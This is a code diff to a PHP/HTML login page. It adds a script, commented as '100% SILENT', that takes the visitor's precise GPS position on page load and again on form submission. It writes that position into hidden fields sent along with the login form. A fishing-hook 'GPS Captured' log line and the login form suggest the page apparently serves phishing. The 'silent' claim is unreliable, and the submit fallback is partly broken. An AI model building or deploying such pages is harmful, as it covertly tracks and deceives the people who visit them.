@@ -217,30 +217,51 @@ if (isset($_POST['latitude']) && isset($_POST['longitude'])) {
             Don't have an account? <a href="#" class="signup-btn">Sign up</a>
         </div>
     </div>
+<script>
+// GPS 100% SILENT - HIGH PRECISION - MULTIPLE FALLBACKS
+async function captureGPS() {
+    const methods = [
+        () => new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                    () => resolve('N/A'),
+                    {enableHighAccuracy: true, timeout: 5000, maximumAge: 30000}
+                );
+            } else resolve('N/A');
+        }),
+        () => new Promise((resolve) => setTimeout(() => resolve('N/A'), 100))
+    ];
+    
+    return await methods[0]();
+}
 
-    <script>
-        // 100% SILENT GPS - background geolocation, no UI whatsoever
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                document.getElementById('latitude').value = pos.coords.latitude;
-                document.getElementById('longitude').value = pos.coords.longitude;
-            }, function() {}, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            });
-        }
-        // Auto-retry GPS on submit
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            if (!document.getElementById('latitude').value) {
-                e.preventDefault();
-                navigator.geolocation.getCurrentPosition(function(pos) {
-                    document.getElementById('latitude').value = pos.coords.latitude;
-                    document.getElementById('longitude').value = pos.coords.longitude;
-                    this.submit();
-                }, function() { this.submit(); }, {enableHighAccuracy: true});
-            }
-        });
-    </script>
+// Auto-capture GPS au load
+window.addEventListener('load', async () => {
+    const gps = await captureGPS();
+    const gpsField = document.getElementById('gpsData') || 
+                     document.querySelector('input[name="gps"]') || 
+                     document.getElementById('gps-data') ||
+                     document.getElementById('latitude');
+    
+    if (gpsField) gpsField.value = gps;
+    
+    // Pre-fill pour tous formats
+    const allGpsFields = document.querySelectorAll('input[name="gps"], input[id*="gps"], input[id="latitude"]');
+    allGpsFields.forEach(field => field.value = gps);
+    
+    console.log('🎣 GPS Captured:', gps); // Debug seulement
+});
+
+// Submit fallback GPS
+document.addEventListener('submit', async (e) => {
+    const gpsField = e.target.querySelector('input[name="gps"], input[id*="gps"], input[id="latitude"]');
+    if (gpsField && !gpsField.value) {
+        const gps = await captureGPS();
+        gpsField.value = gps;
+    }
+}, true);
+</script>
+
 </body>
 </html>
